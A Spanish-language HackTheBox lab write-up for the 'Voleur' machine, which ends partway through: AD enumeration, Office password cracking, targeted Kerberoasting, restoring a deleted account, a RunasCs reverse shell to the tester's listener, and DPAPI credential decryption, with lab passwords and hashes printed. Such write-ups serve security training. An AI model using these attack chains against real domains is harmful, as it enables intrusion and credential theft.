---
title: Voleur - Medium (HTB)
permalink: /Voleur-HTB-Writeup/
tags:
  - Windows
  - Medium
  - Kerberos
  - "LDAP Enumeration"
  - "SMB Enumeration"
  - "Office File"
  - "Hash Cracking"
  - "ACL Rights"
  - WriteSPN
  - "Targeted Kerberoasting"
  - GenericWrite
  - "Deleted Users"
  - "smbclient"
  - "DPAPI Abuse"
  - "Credential Dumping"
  - NTDS
  - PassTheHash
categories:
  - writeup
  - hacking
  - hackthebox
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
seo_tittle: Voleur - Medium (HTB)
seo_description: Enumera recursos SMB, abusa de derechos ACL, abusa de secretos DPAPI y realiza un volcado de credenciales para vencer Voleur.
excerpt: Enumera recursos SMB, abusa de derechos ACL, abusa de secretos DPAPI y realiza un volcado de credenciales para vencer Voleur.
header:
  overlay_image: /assets/images/headers/voleur-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/voleur-hackthebox.jpg
---
![image-center](/assets/images/posts/voleur-hackthebox.png)
{: .align-center}

**Habilidades:** Kerberos Client Setup, LDAP Enumeration, SMB Enumeration, Office File Password Cracking, Abusing AD ACL Rights - `WriteSPN` + Targeted `Kerberoasting`, Abusing AD ACL - `GenericWrite` Rights, Restoring Deleted Users, SMB Enumeration via `impacket-smbclient`, Abusing DPAPI Secrets, Credential Dumping - NTDS, PassTheHash
{: .notice--primary}


# Introducción

Voleur es una máquina Windows de dificultad `Medium` en HackTheBox donde debemos comprometer un entorno Windows que implementa Active Directory.

Comenzaremos con descubrir credenciales en un archivo `.xlsx` para cuentas del dominio, las cuales nos permitirán movernos lateralmente a través de diversas técnicas de abuso de derechos ACL para ganar acceso al DC.

Posteriormente enumeraremos recursos SMB para luego obtener acceso por SSH a un sub-sistema Linux (WSL), el cual contiene una copia de archivos administrativos y altamente sensibles. Realizaremos un volcado de credenciales para obtener control total sobre el dominio.

El creador de esta máquina nos proporciona el siguiente mensaje en la descripción

> Machine Information
>
> As is common in real life Windows pentests, you will start the Voleur box with credentials for the following account: `ryan.naylor` / `HollowOct31Nyt`
{: .notice--info}
<br>
# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping -c 1 10.10.11.76

PING 10.10.11.76 (10.10.11.76): 56 data bytes
64 bytes from 10.10.11.76: icmp_seq=0 ttl=127 time=638.026 ms

--- 10.10.11.76 ping statistics ---
1 packets transmitted, 1 packets received, 0.0% packet loss
round-trip min/avg/max/stddev = 638.026/638.026/638.026/0.000 ms
~~~


## Nmap Scanning 

Iniciaremos el reconocimiento lanzando un escaneo de puertos con `nmap`, el cual se encargará de identificar puertos abiertos en la máquina víctima

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.76 -oG openPorts
 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-04 23:43 -03
Nmap scan report for 10.10.11.76
Host is up (0.14s latency).
Not shown: 65514 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
2222/tcp  open  EtherNetIP-1
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
52981/tcp open  unknown
63551/tcp open  unknown
63552/tcp open  unknown
63554/tcp open  unknown
63578/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 31.76 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Lanzaremos un segundo escaneo mas exhaustivo frente a los puertos identificados, ahora el objetivo será intentar identificar la versión y los servicios que se ejecutan en estos puertos

~~~ bash
nmap -p 53,88,135,139,389,445,464,593,636,2222,3268,3269,5985,9389,49664,49668,52981,63551,63552,63554,63578 -sVC 10.10.11.76 -oN services

Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-04 23:45 -03
Nmap scan report for 10.10.11.76
Host is up (0.15s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-05 10:45:13Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2222/tcp  open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
52981/tcp open  msrpc         Microsoft Windows RPC
63551/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
63552/tcp open  msrpc         Microsoft Windows RPC
63554/tcp open  msrpc         Microsoft Windows RPC
63578/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-11-05T10:46:04
|_  start_date: N/A
|_clock-skew: 7h59m40s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.52 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal

La captura muestra una gran cantidad de servicios propios de Active Directory, como `DNS`, `kerberos`, `LDAP`, `RPC`, entre otros servicios. Esta información nos revela que estamos frente a un controlador de dominio de Active Directory.

Vemos tanto el nombre del dominio como el del DC, agregaremos esta info a nuestro archivo `/etc/hosts` para resolver correctamente el dominio

``` bash
echo '10.10.11.76 voleur.htb dc.voleur.htb' | sudo tee -a /etc/hosts      
10.10.11.76 voleur.htb dc.voleur.htb
```


## Initial Enumeration

Realizaremos una enumeración aprovechando las credenciales proporcionadas. Si intentamos autenticarnos para verificar información del controlador de dominio, notaremos el siguiente mensaje de error

``` bash
nxc smb 10.10.11.76 -u 'ryan.naylor' -p 'HollowOct31Nyt'
SMB         10.10.11.76     445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.10.11.76     445    DC               [-] voleur.htb\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED
```

### Kerberos Client Setup

En este escenario, no es posible el `fallback` hacia el protocolo NTLM debido a que se encuentra deshabilitado. Por lo que optaremos por utilizar autenticación `kerberos`.

> Durante la autenticación `kerberos`, debemos sincronizar nuestro reloj local con el del Controlador de Dominio, debido a que este protocolo involucra al `timestamp` o marca de tempo.
{: .notice--warning}

Podemos hacer uso de la herramienta `ntpdate` para sincronizar nuestro reloj

``` bash
ntpdate dc.rustykey.htb
```

Cuando volvamos a intentar autenticarnos, indicaremos el parámetro `-k` para usar este protocolo. El DC aceptará la autenticación del usuario en cuestión

``` bash
nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
```

> En `kerberos`, el FQDN o `Full Qualified Domain Name` es crítico para validar la identidad y localizar al KDC. Este es el nombre completo y único para cada servidor, este se compone en: `servidor.dominio.com` 
{: .notice--info}

Para hacer uso de `kerberos` en algunas herramientas, debemos utilizar credenciales en caché, las cuales podemos solicitar con la herramienta `getTGT`

~~~ bash
getTGT.py voleur.htb/ryan.naylor:HollowOct31Nyt -dc-ip 10.10.11.76

export KRB5CCNAME=ryan.naylor.ccache
~~~

Por último, podemos generar un archivo de configuración de autenticación `kerberos` para que funcione correctamente la resolución al KDC. El siguiente contenido forma parte del archivo `/etc/krb5.conf` correspondiente al dominio al que nos enfrentamos

``` bash
[libdefaults]
  default_realm = VOLEUR.HTB
  dns_lookup_realm = false
  dns_lookup_kdc = false

[realms]
  VOLEUR.HTB = {
    kdc = dc.voleur.htb
    admin_server = dc.voleur.htb
  }
[domain_realm]
        voleur.htb = VOLEUR.HTB
        .voleur.htb = VOLEUR.HTB
```

Podemos automatizar la creación de este archivo con la herramienta `netexec` (versión > 1.13.0)

``` bash
nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --generate-krb5-file krb5.conf

SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] krb5 conf saved to: krb5.conf
SMB         dc.voleur.htb   445    dc               [+] Run the following command to use the conf file: export KRB5_CONFIG=krb5.conf
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
```

### LDAP Enumeration (Users)

Realizaremos una enumeración a través del protocolo LDAP para identificar usuarios del dominio y generar un listado de usuarios

~~~ bash
ldapsearch -LLL -H ldap://10.10.11.76 -D 'ryan.naylor@voleur.htb' -w 'HollowOct31Nyt' -b 'DC=voleur,DC=htb' "(objectClass=user)" sAMAccountName | grep '^sAMAccountName' | cut -d ' ' -f2-2 | tee users.txt

Administrator
Guest
DC$
krbtgt
ryan.naylor
marie.bryant
lacey.miller
svc_ldap
svc_backup
svc_iis
jeremy.combs
svc_winrm
~~~

### BloodHound

Aprovecharemos las credenciales proporcionadas para recolectar información del dominio, cargarla y posteriormente analizarla mediante la herramienta `Bloodhound`

``` bash
bloodhound-ce-python -d voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k -ns 10.10.11.76 -c All
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: voleur.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 12 users
...
<SNIP>
...
```

### SMB Enumeration

Con la configuración necesaria, podremos utilizar herramientas habituales para enumerar el dominio. En este caso enumeraremos los recursos de red empleando el protocolo SMB

~~~ bash
smbclient -L //dc.voleur.htb/ -U 'mirage.htb/ryan.naylor%HollowOct31Nyt' --use-kerberos=required --realm voleur.htb

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Finance         Disk      
	HR              Disk      
	IPC$            IPC       Remote IPC
	IT              Disk      
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
~~~

Veremos recursos de red que no son habituales, `Finance`, `HR` e `IT`, podemos intentar enumerar cada uno de estos. Sin embargo, solamente tendremos permisos para leer el recurso `IT`

``` bash
smbclient //dc.voleur.htb/IT -U 'mirage.htb/ryan.naylor%HollowOct31Nyt' --use-kerberos=required --realm voleur.htb 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jan 29 06:10:01 2025
  ..                                DHS        0  Thu Jul 24 16:09:59 2025
  First-Line Support                  D        0  Wed Jan 29 06:40:17 2025

		5311743 blocks of size 4096. 976159 blocks available

smb: \> cd "First-Line Support"
smb: \First-Line Support\> dir
  .                                   D        0  Wed Jan 29 04:40:17 2025
  ..                                  D        0  Wed Jan 29 04:10:01 2025
  Access_Review.xlsx                  A    16896  Thu Jan 30 09:14:25 2025
down
		5311743 blocks of size 4096. 903454 blocks available

smb: \First-Line Support\> get Access_Review.xlsx
```

Cuando intentamos abrir el recurso `Access_Review.xlsx`, nos pide una contraseña

![image-center](/assets/images/posts/voleur-1-hackthebox.png)
{: .align-center}
<br>


# Intrusión / Explotación
---
## Office File Password Cracking

La herramienta `office2john` es capaz de generar un hash en formato que sea entendido por `John The Ripper` para intentar descifrarlo por fuerza bruta. Esto lo logra mediante la extracción de datos cifrados de la contraseña.

Guardaremos el hash resultante en un archivo, por ejemplo `office_hash.txt`

~~~ bash
office2john Access_Review.xlsx > office_hash.txt
~~~

Lanzaremos la herramienta `john` empleando el diccionario `rockyou.txt` para intentar descifrar la contraseña

~~~ bash
john --wordlist=/usr/share/wordlists/rockyou.txt office_hash.txt
   
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])
Cost 1 (MS Office version) is 2013 for all loaded hashes
Cost 2 (iteration count) is 100000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football1        (Access_Review.xlsx)     
1g 0:00:00:08 DONE (2025-07-12 21:20) 0.1243g/s 99.50p/s 99.50c/s 99.50C/s football1..martha
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
~~~

Hemos encontrado la contraseña en texto claro equivalente al hash, la cual es `football1`

![image-center](/assets/images/posts/voleur-2-hackthebox.png)
{: .align-center}

Dispondremos de las siguientes credenciales

``` bash
Todd.Wolfe:NightT1meP1dg3on14
svc_ldap:M1XyC9pW7qT5Vn
svc_iis:N5pXyW1VqM7CZ8
```

Intentaremos hacer `Password Spraying` para intentar validar estas credenciales frente a los demás usuarios. 

Solamente serán válidas para los usuarios especificados, mientras que `Todd.Wolfe` no se encuentra dentro de nuestro listado

``` bash
nxc smb dc.voleur.htb -u users.txt -p passes.txt -k --continue-on-success
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False) 
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\svc_ldap:M1XyC9pW7qT5Vn 
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\svc_iis:N5pXyW1VqM7CZ8 
```


## Abusing AD ACL Rights - `WriteSPN`

La cuenta `svc_ldap` posee derechos `WriteSPN` sobre las cuentas `svc_winrm`, además del derecho `GenericWrite` sobre la cuenta `lacey.miller`.

>  Un `Service Principal Name` (SPN) es un identificador único que vincula una instancia de un servicio a una cuenta de inicio de sesión en un entorno de red como Active Directory.
{: .notice--info}

El derecho `WriteSPN` permite escribir sobre el atributo `Service Principal Name` de la cuenta `svc_winrm`, lo que puede aprovecharse para obtener un hash TGS mediante la técnica `Targeted Kerberoast`

![image-center](/assets/images/posts/voleur-3-hackthebox.png)
{: .align-center}

### Targeted `Kerberoasting`

Utilizaremos la herramienta `targetedKerberoast.py` para forzar una escritura de SPN y así volver vulnerable a la cuenta `svc_winrm` al ataque `Kerberoasting`

``` bash
KRB5CCNAME=svc_ldap.ccache /opt/targetedKerberoast/targetedKerberoast.py -d voleur.htb --dc-host dc.voleur.htb -u svc_ldap@voleur.htb -k
 
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (lacey.miller)
$krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$253...
[+] Printing hash for (svc_winrm)
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$ba9...
```

Guardaremos estos hashes TGS en un archivo para intentar descifrarlos para así obtener credenciales en texto claro. Procederemos a usar la herramienta `john` empleando el diccionario `rockyou.txt`

``` bash
john --wordlist=/usr/local/share/wordlists/rockyou.txt hash.txt

Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Press 'q' or Ctrl-C to abort, almost any other key for status
AFireInsidedeOzarctica980219afi (?)
1g 0:00:00:22 DONE (2025-11-10 01:09) 0.04368g/s 501165p/s 501165c/s 501165C/s AG1514AG..AFVSAMA
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Obtuvimos la contraseña en texto claro para la cuenta `svc_winrm`

``` bash
nxc smb dc.voleur.htb -u svc_winrm -p 'AFireInsidedeOzarctica980219afi' -k

SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\svc_winrm:AFireInsidedeOzarctica980219afi
```


## Shell as `svc_winrm`

Podremos conectarnos al DC con esta cuenta, solamente debemos asegurarnos de utilizar autenticación `kerberos`

~~~ bash
getTGT.py voleur.htb/svc_winrm:'AFireInsidedeOzarctica980219afi' -dc-ip dc.voleur.htb
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_winrm.ccache
~~~

Podemos exportar el ticket en la variable de entorno `KRB5CCNAME` así como también utilizarlo dentro del comando para conectarnos con `winrm`

``` bash
KRB5CCNAME=svc_winrm.ccache evil-winrm-py -i dc.voleur.htb -k --no-pass
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to 'dc.voleur.htb:5985' as 'svc_winrm@VOLEUR.HTB'
evil-winrm-py PS C:\Users\svc_winrm\Documents> whoami
voleur\svc_winrm
```

Ya podremos ver la flag del usuario sin privilegios ubicada en el escritorio

``` bash
evil-winrm-py PS C:\Users\svc_winrm\Documents> type ..\Desktop\user.txt
f9d...
```
<br>


# Escalada de Privilegios
---
## Abusing AD ACL - `GenericWrite` Rights

Recordemos que el usuario `svc_ldap` forma parte de un grupo personalizado dentro del dominio, el cual es `Restore Users`

![image-center](/assets/images/posts/voleur-4-hackthebox.png)
{: .align-center}

Además vemos que este grupo tiene derechos `GenericWrite` sobre la OU `Second-Line Support Technicians`

### Shell as `svc_ldap`

Como la cuenta `svc_ldap` no puede conectarse al dominio vía `WinRM`, utilizaremos la herramienta [`RunasCs.exe`](https://github.com/antonioCoco/RunasCs) para ejecutar comandos como esta cuenta en el DC. Subiremos el binario compilado de la siguiente manera (para `evil-winrm-py`)

``` powershell
evil-winrm-py PS C:\Programdata> upload RunasCs.exe .
```

Como esta herramienta nos permite ejecutar comandos, posee la funcionalidad de obtener una shell. Iniciaremos un listener que se encargue de recibirla

~~~ bash
rlwrap nc -lvnp 443
~~~

Ejecutaremos una reverse shell hacia nuestro listener de la siguiente manera

~~~ powershell
PS C:\Temp> .\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell.exe -r 10.10.14.187:4444
~~~

Obtendremos una consola de `powershell` como el usuario `svc_ldap`

``` bash
Connection from 10.10.11.76:58317
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
whoami
voleur\svc_ldap
```

### Restoring Deleted Objects

Con el siguiente comando podremos enumerar usuarios eliminados, veremos a `todd.wolfe`

~~~ bash
PS C:\IT\Third-Line Support> Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects

Deleted           : True
DistinguishedName : CN=Deleted Objects,DC=voleur,DC=htb
Name              : Deleted Objects
ObjectClass       : container
ObjectGUID        : 587cd8b4-6f6a-46d9-8bd4-8fb31d2e18d8

Deleted           : True
DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
Name              : Todd Wolfe
                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
ObjectClass       : user
ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
~~~

Intentaremos restablecer la cuenta del usuario `todd.wolfe` usando la siguiente sintaxis

``` bash
PS C:\Windows\system32> Restore-ADObject -Identity "1c6b1deb-c372-4cbb-87b1-15031de169db"
```

Si echamos un vistazo a la cuenta `todd.wolfe`, veremos que es miembro de la OU (Unidad Organizativa) que vimos antes (la que puede ser controlada por la cuenta `svc_ldap`)

``` powershell
PS C:\Windows\system32> net user todd.wolfe
net user todd.wolfe
User name                    todd.wolfe
Full Name                    Todd Wolfe
Comment                      Second-Line Support Technician
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/29/2025 4:41:13 AM
Password expires             Never
Password changeable          1/30/2025 4:41:13 AM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   1/29/2025 5:16:00 AM

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Second-Line Technicia*Domain Users         
The command completed successfully.
```

Ahora que esta cuenta se encuentra activa, intentaremos validar sus credenciales

~~~ bash
nxc smb dc.voleur.htb -u todd.wolfe -p 'NightT1meP1dg3on14' -k
 
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\todd.wolfe:NightT1meP1dg3on14
~~~

Podemos intentar listar los recursos de red con `nxc` para ver si este usuario tiene acceso a algún recurso diferente

``` bash
nxc smb dc.voleur.htb -u todd.wolfe -p 'NightT1meP1dg3on14' -k --shares

SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\todd.wolfe:NightT1meP1dg3on14 
SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark
SMB         dc.voleur.htb   445    dc               -----           -----------     ------
SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin
SMB         dc.voleur.htb   445    dc               C$                              Default share
SMB         dc.voleur.htb   445    dc               Finance
SMB         dc.voleur.htb   445    dc               HR
SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC
SMB         dc.voleur.htb   445    dc               IT              READ
SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share 
SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share
```


## SMB Enumeration -  `impacket-smbclient`

Al igual que al inicio con `ryan`, tenemos acceso al recurso `IT`. Sin embargo, ahora podemos listar la carpeta `Second-Line Support`

``` bash
smbclient //dc.voleur.htb/IT -U 'mirage.htb/todd.wolfe%NightT1meP1dg3on14' --use-kerberos=required --realm voleur.htb

Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jan 29 06:10:01 2025
  ..                                DHS        0  Thu Jul 24 16:09:59 2025
  Second-Line Support                 D        0  Wed Jan 29 12:13:03 2025

		5311743 blocks of size 4096. 929579 blocks available
```

Podemos usar la herramienta `smbclient` de `impacket` para enumerar más eficientemente

> Si obtienes el error `KDC_ERR_TGT_REVOKED`, se debe a que el `Clean Up` ha eliminado el usuario, por lo que debes volver a habilitarlo con la cuenta `ldap_svc`, para luego solicitar un TGT nuevamente con `todd.wolfe`
{: .notice--danger}

``` bash
KRB5CCNAME=todd.wolfe.ccache smbclient.py dc.voleur.htb -k -no-pass
      
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

# shares 
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
```

Comenzaremos cargando el recurso `IT` con el comando `use`

``` bash
# use IT
```


## Abusing Data Protection API Secrets

> **DPAPI** (Data Protection API) es una API de cifrado integrada en Windows que permite proteger datos sensibles (como contraseñas, claves y credenciales) de forma automática, utilizando las credenciales del usuario o del sistema.
{: .notice--info}

DPAPI protege los datos utilizando una `master key`, normalmente cifrada con las credenciales del usuario en formato hash.

El [abuso o lectura de secretos DPAPI](https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets) es una técnica de post-explotación que logra obtener información sensible protegida por DPAPI. 

Para descifrar datos protegidos por esta funcionalidad de Windows necesitamos extraer los siguientes archivos:

- `Master Key`: Clave maestra, la necesitaremos para desencriptar credenciales
- `Credential File`: Archivo de credenciales protegidas por DPAPI

Los datos se almacenan en el directorio de usuarios y están protegidos por esta clave maestra. Normalmente se encuentran el la siguiente carpeta

~~~ powershell
C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID
~~~

Los datos protegidos suelen encontrarse dentro de los siguientes directorios del usuario

~~~ powershell
C:\Users\$USER\AppData\Local\Microsoft\Credentials\
C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\
~~~

### Finding Credential and Master Key Files via `smbclient`

Ahora buscaremos archivos recursivamente con el comando `tree`, veremos los siguientes archivos correspondientes a `DPAPI` que necesitaremos para abusar de esta técnica, en lo que parece ser una copia de la estructura de carpetas de `todd.wolfe`

``` bash
# tree .

/Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Credentials/772275FAD58525253490A9B0039791D3
...
<SNIP>
...
/Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110/08949382-134f-4c63-b93c-ce52efc0aa88
...
<SNIP>
```

> Puedes cancelar el proceso más rápido presionando `Ctrl+Z` para abandonar el proceso y dejarlo en segundo plano y luego finalizarlo con `kill %`.
{: .notice--warning}

Descargaremos ambos archivos en nuestro directorio de trabajo con el comando `get`. Si volvemos a conectarnos debemos cargar el recurso nuevamente

``` bash
# use IT
# get /Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Credentials/772275FAD58525253490A9B0039791D3

# get /Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110/08949382-134f-4c63-b93c-ce52efc0aa88
```

### Decrypting DPAPI Master Key

Descifraremos la clave maestra contenida dentro del archivo que descargamos con la ayuda de la herramienta de `impacket-dpapi`, utilizando la contraseña del usuario `tedd.wolfe`

~~~ bash
dpapi.py masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14                  
Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
~~~

- `-file`: Archivo de clave maestra
- `-sid`: Identificador del usuario
- `-password`: Contraseña del usuario 

### Decrypting DPAPI Credentials

Utilizaremos la clave maestra para descifrar el archivo de credenciales y verlas en texto claro 

~~~ bash
dpapi.py credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83

Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description : 
Unknown     : 
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
~~~

Vemos las credenciales del usuario `jeremy.combs`, intentaremos validarlas con `netexec`

``` bash
nxc smb dc.voleur.htb -u jeremy.combs -p 'qT3V9pLXyN7W4m' -k

SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\jeremy.combs:qT3V9pLXyN7W4m
```


## Shell as `svc_backup` - `WSL`

Al igual que con el usuario anterior, intentaremos enumerar recursos de red. Veremos algo interesante, lo que parece ser un archivo de clave privada y una nota

~~~ bash
KRB5CCNAME=jeremy.combs.ccache smbclient.py dc.voleur.htb -k -no-pass
 
